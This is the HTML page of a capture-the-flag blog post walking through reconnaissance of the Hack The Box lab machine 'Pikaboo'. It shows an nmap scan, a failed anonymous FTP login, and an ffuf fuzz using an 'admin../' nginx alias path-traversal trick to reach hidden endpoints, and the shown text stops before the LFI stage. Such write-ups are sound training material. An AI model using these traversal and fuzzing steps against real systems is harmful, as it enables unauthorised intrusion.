@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="introduceOS:	 LinuxDifficulty:	HardPoints:	40Release:	17 Jul 2021IP:	10.10.10.249">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-walkthrough[pikaboo]">
+<meta property="og:url" content="https://fdlucifer.github.io/2021/07/20/pikaboo/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	HardPoints:	40Release:	17 Jul 2021IP:	10.10.10.249">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2022.jpg">
+<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2023.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2024.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2025.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2026.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2027.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2028.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2029.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2030.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2031.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2032.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2033.jpg">
+<meta property="article:published_time" content="2021-07-20T10:31:36.000Z">
+<meta property="article:modified_time" content="2021-12-04T19:32:59.758Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="HackTheBox靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2022.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2021/07/20/pikaboo/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/07/20/pikaboo/","path":"2021/07/20/pikaboo/","title":"Hack-The-Box-walkthrough[pikaboo]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-walkthrough[pikaboo] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeration"><span class="nav-number">2.</span> <span class="nav-text">Enumeration</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FTP"><span class="nav-number">3.</span> <span class="nav-text">FTP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Anonymous-Login"><span class="nav-number">3.1.</span> <span class="nav-text">Anonymous Login</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">4.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Visiting-website"><span class="nav-number">4.1.</span> <span class="nav-text">Visiting website</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Intresting-thing"><span class="nav-number">4.2.</span> <span class="nav-text">Intresting thing</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Enumeration-1"><span class="nav-number">4.3.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Fuzzing"><span class="nav-number">4.3.1.</span> <span class="nav-text">Fuzzing</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Visiting-potentially-intresting-endpoint"><span class="nav-number">4.3.2.</span> <span class="nav-text">Visiting potentially intresting endpoint</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Fuzzing-For-LFI"><span class="nav-number">4.3.3.</span> <span class="nav-text">Fuzzing For LFI</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploitation"><span class="nav-number"></span> <span class="nav-text">Exploitation</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Gaining-User"><span class="nav-number"></span> <span class="nav-text">Gaining User</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeration-2"><span class="nav-number">1.</span> <span class="nav-text">Enumeration</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PrivESC-TO-Root"><span class="nav-number"></span> <span class="nav-text">PrivESC TO Root</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeration-3"><span class="nav-number">1.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">1.1.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Contact-me"><span class="nav-number">1.2.</span> <span class="nav-text">Contact me</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/07/20/pikaboo/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-walkthrough[pikaboo] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-walkthrough[pikaboo]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-07-20 18:31:36" itemprop="dateCreated datePublished" datetime="2021-07-20T18:31:36+08:00">2021-07-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2021-12-05 03:32:59" itemprop="dateModified" datetime="2021-12-05T03:32:59+08:00">2021-12-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h2><p>OS:	 Linux<br>Difficulty:	Hard<br>Points:	40<br>Release:	17 Jul 2021<br>IP:	10.10.10.249</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2022.jpg"></p>
+</li>
+<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>use nmap as usual</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.91 scan initiated Sun Jul 18 01:44:59 2021 as: nmap -vvv -p 21,22,80 -A -v -oN intial.nmap 10.129.185.25</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> pikaboo.htb (10.129.185.25)</span><br><span class="line">Host is up, received syn-ack (0.32s latency).</span><br><span class="line">Scanned at 2021-07-18 01:45:01 EDT <span class="keyword">for</span> 18s</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE REASON  VERSION</span><br><span class="line">21/tcp open  ftp     syn-ack vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f (RSA)</span><br><span class="line">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAgG6pLBPMmXneLGYurX9xbt6cE2IYdEN9J/ijCVrQbpUyVeTNWNoFnpB8+DIcppOtsJu0X3Iwpfb1eTmuop8q9nNlmyOcOTBHYOYLQwa+G4e90Bsku86ndqs+LU09sjqss5n3XdZoFqunNfZb7EirVVCgI80Lf8F+3XRRIX3ErqNrk2LiaQQY6fcAaNALaQy9ked7KydWDFYizO2dnu8ee2ncdXFMBeVDKGVfrlHAoRFoTmCEljCP1Vsjt69NDBudCGJBgU1MbItTF7DtbNQWGQmw8/9n9Jq8ic/YxOnIKRDDUuuWdE3sy2dPiw0ZVuG7V2GnkkMsGv0Qn3Uq9Qx7</span><br><span class="line">|   256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIJl6Z/XtGXJwSnO57P3CesJfRbmGNra4AuSSHCGUocKchdp3JnNE704lMnocAevDwi9HsAKARxCup18UpPHz+I=</span><br><span class="line">|   256 f4:<span class="built_in">cd</span>:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINyHVcrR4jjhBG5vZsvKRsKO4SnXj3GqeMtwvFSvd4B4</span><br><span class="line">80/tcp open  http    syn-ack nginx 1.14.2</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">|_http-title: Pikaboo</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Sun Jul 18 01:45:19 2021 -- 1 IP address (1 host up) scanned in 20.01 seconds</span></span><br></pre></td></tr></table></figure>
+
+<p>Looks like we have 3 ports FTP,SSH and WEB.<br>Let’s check FTP for anonymous login.</p>
+<h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><h3 id="Anonymous-Login"><a href="#Anonymous-Login" class="headerlink" title="Anonymous Login"></a>Anonymous Login</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Pikaboo$ ftp pikaboo.htb </span><br><span class="line">Connected to pikaboo.htb.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (pikaboo.htb:kali): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">530 Login incorrect.</span><br><span class="line">Login failed.</span><br><span class="line">ftp&gt; </span><br></pre></td></tr></table></figure>
+
+<p>Looks like we don’t have anonymous login so it is a dead end for now until we have some creds for it.</p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Visiting-website"><a href="#Visiting-website" class="headerlink" title="Visiting website"></a>Visiting website</h3><ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2023.jpg"></li>
+</ul>
+<p>Not much here there is a contact page but not much there as we cannot submit the form.<br>Then we have another page called pokatdex aka pokedex(For Pokemon fans like me).<br>Not necessary for the machine but had to put it in.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2024.jpg"></li>
+</ul>
+<p>Just checking for any pokemon in there we are redirected to the link.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2025.jpg"></li>
+</ul>
+<p>Here we have the link for the api but looks like it still is under construction so not much from here.<br>And finally there is admin page with requires basic authentication for logging in.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2026.jpg"></li>
+</ul>
+<p>Default creds and bruteforce should not work as this is hardbox so let’s think something other than that.</p>
+<h3 id="Intresting-thing"><a href="#Intresting-thing" class="headerlink" title="Intresting thing"></a>Intresting thing</h3><p>Clicking cancel on the basic authentication dialogue box gives us something intresting.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2027.jpg"></li>
+</ul>
+<p>In the image you can see that it is saying it is using apache server on port 81 so there is two intresting thing first is why port 81 instead  of standard port 80 but we will get back to that later and another is nmap says it’s nginx not apache so there must some sort of traffic forwarding and reverse proxy running on the backend and now to the port 81 part as nginx is running onport 80 that is why apache is on port 81 as both should be hosted on same machine.</p>
+<h3 id="Enumeration-1"><a href="#Enumeration-1" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>Looking for version and exploit it seems to be running latest versions of both apache and nginx but I came across this article which specified that there could be path traversal due to misconfigured alias in nginx.</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYWN1bmV0aXguY29tL3Z1bG5lcmFiaWxpdGllcy93ZWIvcGF0aC10cmF2ZXJzYWwtdmlhLW1pc2NvbmZpZ3VyZWQtbmdpbngtYWxpYXMv">https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/<i class="fa fa-external-link-alt"></i></span></p>
+<p>so I thought to give it a try as it is pretty easy just go to the endpoint which ask for the creds and then use ..&#x2F; and then go to the desired directory so I decided to give it a try.</p>
+<h4 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Pikaboo$ ffuf -u http://pikaboo.htb/admin../FUZZ -w /usr/share/wordlists/dirb/big.txt -t 200</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v1.3.0 Kali Exclusive &lt;3</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://pikaboo.htb/admin../FUZZ</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 200</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10]</span></span><br><span class="line"><span class="string">.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10]</span></span><br><span class="line"><span class="string">admin                   [Status: 401, Size: 456, Words: 42, Lines: 15]</span></span><br><span class="line"><span class="string">javascript              [Status: 301, Size: 314, Words: 20, Lines: 10]</span></span><br><span class="line"><span class="string">server-status           [Status: 200, Size: 5531, Words: 265, Lines: 110]</span></span><br><span class="line"><span class="string">:: Progress: [20469/20469] :: Job [1/1] :: 667 req/sec :: Duration: [0:00:35] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure>
+
+<p>Looks like we have found few directories most of then doesn’t look intresting but server-status which is mostly forbidden is now giving 200 status code so let’s check that out.</p>
+<h4 id="Visiting-potentially-intresting-endpoint"><a href="#Visiting-potentially-intresting-endpoint" class="headerlink" title="Visiting potentially intresting endpoint"></a>Visiting potentially intresting endpoint</h4><ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2028.jpg"></li>
+</ul>
+<p>we have something like this if you go through the whole you can find this intresting part.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2029.jpg"></li>
+</ul>
+<p>Now we know we can access admin_staging endpoint using this trick.<br>Visting that endpoint it looks like.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2030.jpg"></li>
+</ul>
+<p>so let’s just see the dashboad so now we finally have admin dashboard or that is what I am assuming at the moment.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2031.jpg"></li>
+</ul>
+<p>looks at the url it looks fishy as it just directly calling the php page so there could be potential LFI there.<br>so let’s FUZZ for that as this box doesn’t have rate limiting and fuzzing is extremly fast so it would be just a couple of seconds.</p>
